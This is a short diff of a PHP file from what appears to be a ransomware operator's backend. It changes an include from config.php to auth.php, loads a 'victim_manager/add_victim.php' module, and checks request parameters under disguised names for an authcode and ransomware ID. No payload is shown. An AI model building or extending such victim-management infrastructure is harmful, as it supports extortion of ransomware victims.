@@ -1,6 +1,6 @@
 <?php
 
-require_once('config.php');
+require_once('auth.php');
 require_once('victim_manager/add_victim.php');
 #to check for authcode and ransomware_id params in http request
 if(isset($_GET['if_i_look_back_i_m_lost'])&&isset($_GET['winter_is_coming'])&&isset($_GET['seven_kingdoms'])){
